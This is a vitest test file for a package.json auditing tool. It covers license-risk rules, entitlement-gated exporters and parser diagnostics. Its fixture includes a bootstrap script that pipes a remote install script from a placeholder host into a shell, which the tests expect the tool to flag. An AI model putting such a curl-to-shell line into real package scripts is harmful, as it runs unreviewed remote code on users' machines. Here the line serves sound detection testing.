import { describe, expect, it } from 'vitest';
import {
  EntitlementError,
  ToolRegistry,
  jsonWorkspaceSerializer,
  runExporter,
  runParser,
  validateManifest,
} from '@nekotools/tool-runtime';
import type { Entitlement, Workspace } from '@nekotools/contracts';

import {
  auditPackage,
  buildPackageRegistration,
  FIXED_CLOCK,
  PACKAGE_KIND_MANIFEST,
  packageManifest,
  type PackageManifestArtifact,
} from '../index.js';

const PRO: Entitlement = {
  version: 1,
  licenseId: 'TEST',
  licensee: 'Test User',
  tier: 'pro',
  features: ['*'],
  issuedAt: '2026-01-01T00:00:00.000Z',
  expiresAt: null,
  signature: 'test',
};

const clock = FIXED_CLOCK('2026-05-28T00:00:00.000Z');

function registry(): ToolRegistry {
  const r = new ToolRegistry();
  r.register(buildPackageRegistration(clock));
  return r;
}

function parse(raw: string) {
  return runParser(registry(), 'package', 'package.json', {
    raw,
    source: { kind: 'paste', bytes: raw.length },
  });
}

function manifestOf(raw: string): PackageManifestArtifact {
  return parse(raw).artifacts.find(
    (artifact): artifact is PackageManifestArtifact => artifact.kind === PACKAGE_KIND_MANIFEST,
  )!;
}

const SAMPLE = JSON.stringify(
  {
    name: 'nekotools',
    version: '0.0.0',
    private: true,
    type: 'module',
    packageManager: 'pnpm@9.0.0',
    scripts: {
      build: 'tsc -b',
      postinstall: 'node ./scripts/setup.js',
      bootstrap: 'curl https://example.invalid/install.sh | sh',
    },
    dependencies: {
      react: '^18.3.1',
      shared: '*',
    },
    devDependencies: {
      typescript: '^6.0.3',
      shared: '^1.0.0',
      remote: 'github:example/pkg',
    },
  },
  null,
  2,
);

describe('NekoPackage: manifest', () => {
  it('passes schema + cross-field validation', () => {
    const result = validateManifest(packageManifest);
    expect(result.ok, result.errors.join('; ')).toBe(true);
  });

  it('declares network-forbidden offline policy', () => {
    expect(packageManifest.offlinePolicy.networkPolicy).toBe('network-forbidden');
  });

  it('still advertises future Pro capabilities (policy packs, lockfile audit)', () => {
    expect(packageManifest.entitlements.pro).toContain('policy.packs');
    expect(packageManifest.entitlements.pro).toContain('lockfile.audit');
  });
});

describe('NekoPackage: monetization gating (single-build, entitlement-gated)', () => {
  const proExporterIds = ['package.export.policy.report', 'package.export.ci.guard'];

  it('Pro exporters are declared AND registered as proExporters, not free', () => {
    const reg = buildPackageRegistration(clock);
    const proIds = new Set((reg.proExporters ?? []).map((e) => e.id));
    for (const id of proExporterIds) {
      expect(packageManifest.exporters).toContain(id);
      expect(proIds.has(id)).toBe(true);
      expect(reg.exporters.some((e) => e.id === id)).toBe(false);
    }
  });

  it('declares the matching ci.guard.export pro entitlement', () => {
    expect(packageManifest.entitlements.pro).toContain('ci.guard.export');
  });

  it('a free caller (default entitlement) is refused with EntitlementError', () => {
    const r = registry();
    const parsed = parse(SAMPLE);
    for (const id of proExporterIds) {
      expect(() => runExporter(r, 'package', id, parsed)).toThrow(EntitlementError);
    }
  });

  it('a Pro entitlement unlocks the policy report + CI guard exporters', () => {
    const r = registry();
    const parsed = parse(SAMPLE);

    const report = String(runExporter(r, 'package', 'package.export.policy.report', parsed, PRO).body);
    expect(report).toContain('# NekoPackage risk audit');
    expect(report).toContain('package.network_shell_script');

    const guardResult = runExporter(r, 'package', 'package.export.ci.guard', parsed, PRO);
    expect(guardResult.mimeType).toBe('application/json');
    expect(guardResult.extension).toBe('json');
    const guard = JSON.parse(String(guardResult.body));
    expect(guard.tool).toBe('nekopackage');
    expect(guard.failOn).toEqual(['high', 'medium']);
    // SAMPLE has a network-shell script (high) → the gate must fail.
    expect(guard.pass).toBe(false);
    expect(guard.exitCode).toBe(1);
    expect(
      guard.violations.some((v: { ruleId: string }) => v.ruleId === 'package.network_shell_script'),
    ).toBe(true);
  });

  it('the CI guard passes a clean package', () => {
    const r = registry();
    const parsed = parse(JSON.stringify({ name: 'clean', version: '1.0.0', private: true, license: 'MIT' }));
    const guard = JSON.parse(String(runExporter(r, 'package', 'package.export.ci.guard', parsed, PRO).body));
    expect(guard.pass).toBe(true);
    expect(guard.exitCode).toBe(0);
    expect(guard.violations).toEqual([]);
  });

  it('a truly unknown exporter id still throws "unknown exporter"', () => {
    expect(() =>
      runExporter(registry(), 'package', 'package.export.nope', { artifacts: [], diagnostics: [] }, PRO),
    ).toThrow(/unknown exporter/);
  });
});

describe('NekoPackage: dependency & license-risk audit', () => {
  const audit = (raw: string) => auditPackage(manifestOf(raw).value);

  it('classifies a strong/network copyleft license as high', () => {
    const f = audit(JSON.stringify({ name: 'a', version: '1.0.0', license: 'AGPL-3.0-only' })).find(
      (x) => x.ruleId === 'package.license_copyleft',
    );
    expect(f?.severity).toBe('high');
  });

  it('classifies GPL as medium and LGPL as low copyleft', () => {
    const gpl = audit(JSON.stringify({ name: 'a', version: '1.0.0', license: 'GPL-3.0-only' }));
    const lgpl = audit(JSON.stringify({ name: 'a', version: '1.0.0', license: 'LGPL-3.0-only' }));
    expect(gpl.find((x) => x.ruleId === 'package.license_copyleft')?.severity).toBe('medium');
    expect(lgpl.find((x) => x.ruleId === 'package.license_copyleft')?.severity).toBe('low');
  });

  it('flags a public package with no license, but not a private one', () => {
    const pub = audit(JSON.stringify({ name: 'a', version: '1.0.0' })).map((x) => x.ruleId);
    const priv = audit(JSON.stringify({ name: 'a', version: '1.0.0', private: true })).map((x) => x.ruleId);
    expect(pub).toContain('package.license_missing');
    expect(priv).not.toContain('package.license_missing');
  });

  it('treats a permissive license as clean (no copyleft finding)', () => {
    expect(
      audit(JSON.stringify({ name: 'a', version: '1.0.0', license: 'MIT' })).map((x) => x.ruleId),
    ).not.toContain('package.license_copyleft');
  });

  it('elevates the parser risk signals into ruleId-keyed findings', () => {
    const ids = audit(SAMPLE).map((x) => x.ruleId);
    expect(ids).toContain('package.network_shell_script');
    expect(ids).toContain('package.lifecycle_script');
    expect(ids).toContain('package.remote_dependency');
    expect(ids).toContain('package.unpinned_dependency');
    expect(ids).toContain('package.duplicate_dependency');
  });

  it('returns nothing for an absent document', () => {
    expect(auditPackage(undefined)).toEqual([]);
  });
});

describe('NekoPackage: parser', () => {
  it('summarizes package metadata, scripts, and dependency counts', () => {
    const artifact = manifestOf(SAMPLE);
    expect(artifact.value.name).toBe('nekotools');
    expect(artifact.value.packageManager).toBe('pnpm@9.0.0');
    expect(artifact.value.scripts.map((script) => script.name)).toContain('build');
    expect(artifact.value.dependencyCounts.total).toBe(5);
  });

  it('flags lifecycle scripts, network shell scripts, duplicate deps, remote deps, and unpinned deps', () => {
    const result = parse(SAMPLE);
    const codes = result.diagnostics.map((diagnostic) => diagnostic.code);
    expect(codes).toContain('package.lifecycle_script');
    expect(codes).toContain('package.network_shell_script');
    expect(codes).toContain('package.duplicate_dependency');
    expect(codes).toContain('package.remote_dependency');
    expect(codes).toContain('package.unpinned_dependency');
  });

  it('emits invalid JSON diagnostics without throwing', () => {
    const result = parse('{"name":');
    expect(result.artifacts).toHaveLength(1);
    expect((result.artifacts[0] as PackageManifestArtifact).value.valid).toBe(false);
    expect(result.diagnostics.find((diagnostic) => diagnostic.code === 'package.invalid_json'))
      .toBeDefined();
  });

  it('flags a public package missing version', () => {
    const result = parse(JSON.stringify({ name: 'missing-version' }));
    expect(result.diagnostics.find((diagnostic) => diagnostic.code === 'package.missing_version'))
      .toBeDefined();
  });

  it('flags non-object dependency sections', () => {
    const result = parse(JSON.stringify({ name: 'bad', version: '1.0.0', dependencies: [] }));
    expect(result.diagnostics.find((diagnostic) => diagnostic.code === 'package.invalid_section'))
      .toBeDefined();
  });
});

describe('NekoPackage: exporters and workspace', () => {
  it('exports a JSON summary', () => {
    const result = parse(SAMPLE);
    const body = runExporter(registry(), 'package', 'package.export.summary.json', {
      artifacts: result.artifacts,
      diagnostics: result.diagnostics,
    }).body;
    const parsed = JSON.parse(String(body));
    expect(parsed.name).toBe('nekotools');
    expect(
      parsed.diagnostics.some(
        (diagnostic: { code: string }) => diagnostic.code === 'package.remote_dependency',
      ),
    ).toBe(true);
  });

  it('exports a Markdown summary', () => {
    const result = parse(SAMPLE);
    const body = runExporter(registry(), 'package', 'package.export.markdown.summary', {
      artifacts: result.artifacts,
      diagnostics: result.diagnostics,
    }).body;
    expect(String(body)).toContain('# NekoPackage summary');
    expect(String(body)).toContain('package.remote_dependency');
  });

  it('round-trips through the workspace serializer', () => {
    const result = parse(SAMPLE);
    const workspace: Workspace = {
      version: 1,
      id: 'ws_package',
      toolId: 'package',
      toolVersion: 1,
      artifacts: result.artifacts,
      diagnostics: result.diagnostics,
      createdAt: clock.now(),
      updatedAt: clock.now(),
      uiState: { showDependencies: true, showScripts: true },
    };
    const serialized = jsonWorkspaceSerializer.serialize(workspace);
    const restored = jsonWorkspaceSerializer.deserialize(serialized);
    expect(restored.artifacts[0]?.kind).toBe(PACKAGE_KIND_MANIFEST);
  });
});
